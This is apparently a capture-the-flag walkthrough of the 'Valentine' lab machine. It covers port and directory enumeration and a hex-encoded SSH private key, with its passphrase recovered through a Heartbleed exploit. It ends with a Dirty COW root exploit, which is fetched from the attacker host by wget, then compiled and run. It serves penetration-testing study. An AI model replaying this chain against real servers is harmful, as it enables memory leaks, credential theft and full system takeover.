# Valentine

**Machine ip:** 10.10.10.79

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.79 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.79`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a5af2de-0964-4271-8eca-8effda4969a4)

+ The result shows that 3 TCP ports are open:
```
Port 22: OpenSSH 5.9p1
Port 80: Apache httpd 2.2.22 - http
Port 443: Apache httpd 2.2.22 - ssl/http
```

+ Always start off with enumerating web server first.
+ Navigate to `http://10.10.10.79/` and `https://10.10.10.79/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2e7a885d-77a8-4ff9-9cdd-da6b5f8d4f7d)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d60c550-7640-44e1-8e65-7a18cb13a466)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.79 -k -n -r -t 40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a52ada15-15c5-4ee2-90f7-0c8f0fe0674c)

+ **http://10.10.10.79/dev** is interesting, and check it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4df11af5-3180-4ff4-a124-4bcd535dc49d)

+ **http://10.10.10.79/dev/hype_key** is hex encoded. Decode it using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MmQgMmQgMmQgMmQgMmQgNDIgNDUgNDcgNDkgNGUgMjAgNTIgNTMgNDEgMjAgNTAgNTIgNDkgNTYgNDEgNTQgNDUgMjAgNGIgNDUgNTkgMmQgMmQgMmQgMmQgMmQgMGQgMGEgNTAgNzIgNmYgNjMgMmQgNTQgNzkgNzAgNjUgM2EgMjAgMzQgMmMgNDUgNGUgNDMgNTIgNTkgNTAgNTQgNDUgNDQgMGQgMGEgNDQgNDUgNGIgMmQgNDkgNmUgNjYgNmYgM2EgMjAgNDEgNDUgNTMgMmQgMzEgMzIgMzggMmQgNDMgNDIgNDMgMmMgNDEgNDUgNDIgMzggMzggNDMgMzEgMzQgMzAgNDYgMzYgMzkgNDIgNDYgMzIgMzAgMzcgMzQgMzcgMzggMzggNDQgNDUgMzIgMzQgNDEgNDUgMzQgMzggNDQgMzQgMzYgMGQgMGEgMGQgMGEgNDQgNjIgNTAgNzIgNGYgMzcgMzggNmIgNjUgNjcgNGUgNzUgNmIgMzEgNDQgNDEgNzEgNmMgNDEgNGUgMzUgNmEgNjIgNmEgNTggNzYgMzAgNTAgNTAgNzMgNmYgNjcgMzMgNmEgNjQgNjIgNGQgNDYgNTMgMzggNjkgNDUgMzkgNzAgMzMgNTUgNGYgNGMgMzAgNmMgNDYgMzAgNzggNjYgMzcgNTAgN2EgNmQgNzIgNmIgNDQgNjEgMzggNTIgMGQgMGEgMzUgNzkgMmYgNjIgMzQgMzYgMmIgMzkgNmUgNDUgNzAgNDMgNGQgNjYgNTQgNTAgNjggNGUgNzUgNGEgNTIgNjMgNTcgMzIgNTUgMzIgNjcgNGEgNjMgNGYgNDYgNDggMmIgMzkgNTIgNGEgNDQgNDIgNDMgMzUgNTUgNGEgNGQgNTUgNTMgMzEgMmYgNjcgNmEgNDIgMmYgMzcgMmYgNGQgNzkgMzAgMzAgNGQgNzcgNzggMmIgNjEgNDkgMzYgMGQgMGEgMzAgNDUgNDkgMzAgNTMgNjIgNGYgNTkgNTUgNDEgNTYgMzEgNTcgMzQgNDUgNTYgMzcgNmQgMzkgMzYgNTEgNzMgNWEgNmEgNzIgNzcgNGEgNzYgNmUgNmEgNTYgNjEgNjYgNmQgMzYgNTYgNzMgNGIgNjEgNTQgNTAgNDIgNDggNzAgNzUgNjcgNjMgNDEgNTMgNzYgNGQgNzEgN2EgMzcgMzYgNTcgMzYgNjEgNjIgNTIgNWEgNjUgNTggNjkgMGQgMGEgNDUgNjIgNzcgMzYgMzYgNjggNmEgNDYgNmQgNDEgNzUgMzQgNDEgN2EgNzEgNjMgNGQgMmYgNmIgNjkgNjcgNGUgNTIgNDYgNTAgNTkgNzUgNGUgNjkgNTggNzIgNTggNzMgMzEgNzcgMmYgNjQgNjUgNGMgNDMgNzEgNDMgNGEgMmIgNDUgNjEgMzEgNTQgMzggN2EgNmMgNjEgNzMgMzYgNjYgNjMgNmQgNjggNGQgMzggNDEgMmIgMzggNTAgMGQgMGEgNGYgNTggNDIgNGIgNGUgNjUgMzYgNmMgMzEgMzcgNjggNGIgNjEgNTQgMzYgNzcgNDYgNmUgNzAgMzUgNjUgNTggNGYgNjEgNTUgNDkgNDggNzYgNDggNmUgNzYgNGYgMzYgNTMgNjMgNDggNTYgNTcgNTIgNzIgNWEgMzcgMzAgNjYgNjMgNzAgNjMgNzAgNjkgNmQgNGMgMzEgNzcgMzEgMzMgNTQgNjcgNjQgNjQgMzIgNDEgNjkgNDcgNjQgMGQgMGEgNzAgNDggNGMgNGEgNzAgNTkgNTUgNDkgNDkgMzUgNTAgNzUgNGYgMzYgNzggMmIgNGMgNTMgMzggNmUgMzEgNzIgMmYgNDcgNTcgNGQgNzEgNTMgNGYgNDUgNjkgNmQgNGUgNTIgNDQgMzEgNmEgMmYgMzUgMzkgMmYgMzQgNzUgMzMgNTIgNGYgNzIgNTQgNDMgNGIgNjUgNmYgMzkgNDQgNzMgNTQgNTIgNzEgNzMgMzIgNmIgMzEgNTMgNDggMGQgMGEgNTEgNjQgNTcgNzcgNDYgNzcgNjEgNTggNjIgNTkgNzkgNTQgMzEgNzUgNzggNDEgNGQgNTMgNmMgMzUgNDggNzEgMzkgNGYgNDQgMzUgNDggNGEgMzggNDcgMzAgNTIgMzYgNGEgNDkgMzUgNTIgNzYgNDMgNGUgNTUgNTEgNmEgNzcgNzggMzAgNDYgNDkgNTQgNmEgNmEgNGQgNmEgNmUgNGMgNDkgNzAgNzggNmEgNzYgNjYgNzEgMmIgNDUgMGQgMGEgNzAgMzAgNjcgNDQgMzAgNTUgNjMgNzkgNmMgNGIgNmQgMzYgNzIgNDMgNWEgNzEgNjEgNjMgNzcgNmUgNTMgNjQgNjQgNDggNTcgMzggNTcgMzMgNGMgNzggNGEgNmQgNDMgNzggNjQgNzggNTcgMzUgNmMgNzQgMzUgNjQgNTAgNmEgNDEgNmIgNDIgNTkgNTIgNTUgNmUgNmMgMzkgMzEgNDUgNTMgNDMgNjkgNDQgMzQgNWEgMmIgNzUgNDMgMGQgMGEgNGYgNmMgMzYgNmEgNGMgNDYgNDQgMzIgNmIgNjEgNGYgNGMgNjYgNzUgNzkgNjUgNjUgMzAgNjYgNTkgNDMgNjIgMzcgNDcgNTQgNzEgNGYgNjUgMzcgNDUgNmQgNGQgNDIgMzMgNjYgNDcgNDkgNzcgNTMgNjQgNTcgMzggNGYgNDMgMzggNGUgNTcgNTQgNmIgNzcgNzAgNmEgNjMgMzAgNDUgNGMgNjIgNmMgNTUgNjEgMzYgNzUgNmMgNGYgMGQgMGEgNzQgMzkgNjcgNzIgNTMgNmYgNzMgNTIgNTQgNDMgNzMgNWEgNjQgMzEgMzQgNGYgNTAgNzQgNzMgMzQgNjIgNGMgNzMgNzAgNGIgNzggNGQgNGQgNGYgNzMgNjcgNmUgNGIgNmMgNmYgNTggNzYgNmUgNmMgNTAgNGYgNTMgNzcgNTMgNzAgNTcgNzkgMzkgNTcgNzAgMzYgNzkgMzggNTggNTggMzggMmIgNDYgMzQgMzAgNzIgNzggNmMgMzUgMGQgMGEgNTggNzEgNjggNDQgNTUgNDIgNjggNzkgNmIgMzEgNDMgMzMgNTkgNTAgNGYgNjkgNDQgNzUgNTAgNGYgNmUgNGQgNTggNjEgNDkgNzAgNjUgMzEgNjQgNjcgNjIgMzAgNGUgNjQgNDQgMzEgNGQgMzkgNWEgNTEgNTMgNGUgNTUgNGMgNzcgMzEgNDQgNDggNDMgNDcgNTAgNTAgMzQgNGEgNTMgNTMgNzggNTggMzcgNDIgNTcgNjQgNDQgNGIgMGQgMGEgNjEgNDEgNmUgNTcgNGEgNzYgNDYgNjcgNmMgNDEgMzQgNmYgNDYgNDIgNDIgNTYgNDEgMzggNzUgNDEgNTAgNGQgNjYgNTYgMzIgNTggNDYgNTEgNmUgNmEgNzcgNTUgNTQgMzUgNjIgNTAgNGMgNDMgMzYgMzUgNzQgNDYgNzMgNzQgNmYgNTIgNzQgNTQgNWEgMzEgNzUgNTMgNzIgNzUgNjEgNjkgMzIgMzcgNmIgNzggNTQgNmUgNGMgNTEgMGQgMGEgMmIgNzcgNTEgMzggMzcgNmMgNGQgNjEgNjQgNjQgNzMgMzEgNDcgNTEgNGUgNjUgNDcgNzMgNGIgNTMgNjYgMzggNTIgMmYgNzIgNzMgNTIgNGIgNjUgNjUgNGIgNjMgNjkgNmMgNDQgNjUgNTAgNDMgNmEgNjUgNjEgNGMgNzEgNzQgNzEgNzggNmUgNjggNGUgNmYgNDYgNzQgNjcgMzAgNGQgNzggNzQgMzYgNzIgMzIgNjcgNjIgMzEgNDUgMGQgMGEgNDEgNmMgNmYgNTEgMzYgNmEgNjcgMzUgNTQgNjIgNmEgMzUgNGEgMzcgNzEgNzUgNTkgNTggNWEgNTAgNzkgNmMgNDIgNmMgNmEgNGUgNzAgMzkgNDcgNTYgNzAgNjkgNmUgNTAgNjMgMzMgNGIgNzAgNDggNzQgNzQgNzYgNjcgNjIgNzAgNzQgNjYgNjkgNTcgNDUgNDUgNzMgNWEgNTkgNmUgMzUgNzkgNWEgNTAgNjggNTUgNzIgMzkgNTEgMGQgMGEgNzIgMzAgMzggNzAgNmIgNGYgNzggNDEgNzIgNTggNDUgMzIgNjQgNmEgMzcgNjUgNTggMmIgNjIgNzEgMzYgMzUgMzYgMzMgMzUgNGYgNGEgMzYgNTQgNzEgNDggNjIgNDEgNmMgNTQgNTEgMzEgNTIgNzMgMzkgNTAgNzUgNmMgNzIgNTMgMzcgNGIgMzQgNTMgNGMgNTggMzcgNmUgNTkgMzggMzkgMmYgNTIgNWEgMzUgNmYgNTMgNTEgNjUgMGQgMGEgMzIgNTYgNTcgNTIgNzkgNTQgNWEgMzEgNDYgNjYgNmUgNjcgNGEgNTMgNzMgNzYgMzkgMmIgNGQgNjYgNzYgN2EgMzMgMzQgMzEgNmMgNjIgN2EgNGYgNDkgNTcgNmQgNmIgMzcgNTcgNjYgNDUgNjMgNTcgNjMgNDggNjMgMzEgMzYgNmUgMzkgNTYgMzAgNDkgNjIgNTMgNGUgNDEgNGMgNmUgNmEgNTQgNjggNzYgNDUgNjMgNTAgNmIgNzkgMGQgMGEgNjUgMzEgNDIgNzMgNjYgNTMgNjIgNzMgNjYgMzkgNDYgNjcgNzUgNTUgNWEgNmIgNjcgNDggNDEgNmUgNmUgNjYgNTIgNGIgNmIgNDcgNTYgNDcgMzEgNGYgNTYgNzkgNzUgNzcgNjMgMmYgNGMgNTYgNmEgNmQgNjIgNjggNWEgN2EgNGIgNzcgNGMgNjggNjEgNWEgNTIgNGUgNjQgMzggNDggNDUgNGQgMzggMzYgNjYgNGUgNmYgNmEgNTAgMGQgMGEgMzAgMzkgNmUgNTYgNmEgNTQgNjEgNTkgNzQgNTcgNTUgNTggNmIgMzAgNTMgNjkgMzEgNTcgMzAgMzIgNzcgNjIgNzUgMzEgNGUgN2EgNGMgMmIgMzEgNTQgNjcgMzkgNDkgNzAgNGUgNzkgNDkgNTMgNDYgNDMgNDYgNTkgNmEgNTMgNzEgNjkgNzkgNDcgMmIgNTcgNTUgMzcgNDkgNzcgNGIgMzMgNTkgNTUgMzUgNmIgNzAgMzMgNDMgNDMgMGQgMGEgNjQgNTkgNTMgNjMgN2EgMzYgMzMgNTEgMzIgNzAgNTEgNjEgNjYgNzggNjYgNTMgNjIgNzUgNzYgMzQgNDMgNGQgNmUgNGUgNzAgNjQgNjkgNzIgNTYgNGIgNDUgNmYgMzUgNmUgNTIgNTIgNjYgNGIgMmYgNjkgNjEgNGMgMzMgNTggMzEgNTIgMzMgNDQgNzggNTYgMzggNjUgNTMgNTkgNDYgNGIgNDYgNGMgMzYgNzAgNzEgNzAgNzUgNTggMGQgMGEgNjMgNTkgMzUgNTkgNWEgNGEgNDcgNDEgNzAgMmIgNGEgNzggNzMgNmUgNDkgNTEgMzkgNDMgNDYgNzkgNzggNDkgNzQgMzkgMzIgNjYgNzIgNTggN2EgNmUgNzMgNmEgNjggNmMgNTkgNjEgMzggNzMgNzYgNjIgNTYgNGUgNGUgNjYgNmIgMmYgMzkgNjYgNzkgNTggMzYgNmYgNzAgMzIgMzQgNzIgNGMgMzIgNDQgNzkgNDUgNTMgNzAgNTkgMGQgMGEgNzAgNmUgNzMgNzUgNmIgNDIgNDMgNDYgNDIgNmIgNWEgNDggNTcgNGUgNGUgNzkgNjUgNGUgMzcgNjIgMzUgNDcgNjggNTQgNTYgNDMgNmYgNjQgNDggNjggN2EgNDggNTYgNDYgNjUgNjggNTQgNzUgNDIgNzIgNzAgMmIgNTYgNzUgNTAgNzEgNjEgNzEgNDQgNzYgNGQgNDMgNTYgNjUgMzEgNDQgNWEgNDMgNjIgMzQgNGQgNmEgNDEgNmEgMGQgMGEgNGQgNzMgNmMgNjYgMmIgMzkgNzggNGIgMmIgNTQgNTggNDUgNGMgMzMgNjkgNjMgNmQgNDkgNGYgNDIgNTIgNjQgNTAgNzkgNzcgMzYgNjUgMmYgNGEgNmMgNTEgNmMgNTYgNTIgNmMgNmQgNTMgNjggNDYgNzAgNDkgMzggNjUgNjIgMmYgMzggNTYgNzMgNTQgNzkgNGEgNTMgNjUgMmIgNjIgMzggMzUgMzMgN2EgNzUgNTYgMzIgNzEgNGMgMGQgMGEgNzMgNzUgNGMgNjEgNDIgNGQgNzggNTkgNGIgNmQgMzMgMmIgN2EgNDUgNDQgNDkgNDQgNzYgNjUgNGIgNTAgNGUgNjEgNjEgNTcgNWEgNjcgNDUgNjMgNzEgNzggNzkgNmMgNDMgNDMgMmYgNzcgNTUgNzkgNTUgNTggNmMgNGQgNGEgMzUgMzAgNGUgNzcgMzYgNGEgNGUgNTYgNGQgNGQgMzggNGMgNjUgNDMgNjkgNjkgMzMgNGYgNDUgNTcgMGQgMGEgNmMgMzAgNmMgNmUgMzkgNGMgMzEgNjIgMmYgNGUgNTggNzAgNDggNmEgNDcgNjEgMzggNTcgNDggNDggNTQgNmEgNmYgNDkgNjkgNmMgNDIgMzUgNzEgNGUgNTUgNzkgNzkgNzcgNTMgNjUgNTQgNDIgNDYgMzIgNjEgNzcgNTIgNmMgNTggNDggMzkgNDIgNzIgNmIgNWEgNDcgMzQgNDYgNjMgMzQgNjcgNjQgNmQgNTcgMmYgNDkgN2EgNTQgMGQgMGEgNTIgNTUgNjcgNWEgNmIgNjIgNGQgNTEgNWEgNGUgNDkgNDkgNjYgN2EgNmEgMzEgNTEgNzUgNjkgNmMgNTIgNTYgNDIgNmQgMmYgNDYgMzcgMzYgNTkgMmYgNTkgNGQgNzIgNmQgNmUgNGQgMzkgNmIgMmYgMzEgNzggNTMgNDcgNDkgNzMgNmIgNzcgNDMgNTUgNTEgMmIgMzkgMzUgNDMgNDcgNDggNGEgNDUgMzggNGQgNmIgNjggNDQgMzMgMGQgMGEgMmQgMmQgMmQgMmQgMmQgNDUgNGUgNDQgMjAgNTIgNTMgNDEgMjAgNTAgNTIgNDkgNTYgNDEgNTQgNDUgMjAgNGIgNDUgNTkgMmQgMmQgMmQgMmQgMmQKCg)

**Notes:** You should never enter your, anyone else's and customer's credentials in online tools just in case it gets logged at the backend! In this case, it doesn't matter as this is a not real security assessment.

+ Decoded form is ssh credential, and **hype** is possible ssh username from **hype_key** file name.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/002868a3-a360-473a-bdfc-b128ed33353f)

+ Login ssh: `ssh -i id_rsa hype@10.10.10.79`
+ `chmod 600 id_rsa`
+ It requires password.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1e082bc-05d6-4068-acd0-45d969777a71)

+ Do more enumeration: `sudo nmap -Pn -n --script vuln -p$ports 10.10.10.79`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff889a3f-83fa-49a3-9646-8c17dcc949db)

+ Port 443 is running a version of OpenSSL that is vulnerable to **Heartbleed**!
+ `git clone https://gist.github.com/eelsivart/10174134`
+ `python heartbleed.py 10.10.10.79`
+ View **decode.php** and **text** value.
```
┌──(kali㉿kali)-[~/Desktop/10174134]
└─$ python2 heartbleed.py 10.10.10.79     

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.7.U.[..S..6?....................nnection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET /printer/ HTTP/1.1
Host: 10.10.10.79
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54f4c737-c556-4002-a270-a5a4e453b02a)

+ Navigate to **http://10.10.10.79/decode.php**. Copy the **text** value, and decode it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8043e8ba-37eb-4804-adc4-599ff419d146)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7fe3609b-9537-4bb9-be08-aa29b64eefff)

+ Use the decoded value `heartbleedbelievethehype` on ssh login.
+ Try to login ssh again: `ssh -i id_rsa hype@10.10.10.79`
+ If you face a problem **sign_and_send_pubkey: no mutual signature supported**, check [the link](https://hazercloud.com/blog/sign_and_send_pubkey-no-mutual-signature-supported/).
+ We login successfully, and get the user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0a4080-0c44-44b8-8073-e4f321d78fc9)

## Privilege Escalation

### 1.Method:
+ Check kernel version: `uname -a`
+ `searchsploit dirty`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56ba4843-5761-4104-aec6-e2c4ee4535a7)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/85e1e1bd-fd8a-4916-9ddf-1b6740cd54d3)

+ Get the exploit: `searchsploit -m 40839`
+ Transfer the exploit, and compile:
```
wget 10.10.14.6:8000/40839.c
gcc -pthread 40839.c -o exploit -lcrypt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bdd5132d-5749-4b57-a567-1ed25b8bade2)

+ Run the exploit, and get root shell: `./exploit`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9c9a866b-e555-4cb2-b6b6-d95a75651378)













# References & Alternatives:
+ https://vvmlist.github.io/#valentine
+ 
